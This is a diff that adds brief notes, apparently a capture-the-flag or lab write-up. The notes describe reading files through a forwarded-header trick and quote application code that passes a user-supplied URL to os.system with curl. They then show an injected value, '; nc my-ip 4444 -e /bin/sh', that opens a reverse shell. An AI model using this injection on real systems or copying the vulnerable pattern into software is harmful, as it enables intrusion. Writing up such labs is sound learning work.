@@ -1,0 +1,16 @@
+there was api page with 4 commands
+
+to access log we used X-Forward .. and can read files ..
+
+we read ./main.py and it had
+
+```
+os.system(&#34;curl {} -o /home/clumsyadmin/app&#34;.format(data[&#39;url&#39;]))
+            return(&#34;Update requested by {}. Restart the software for changes to take effect.&#34;.format(data[&#39;user&#39;]))
+```
+
+so if we did `http://ip/; nc my-ip 4444 -e /bin/sh `
+
+we get shell
+
+esc was simple
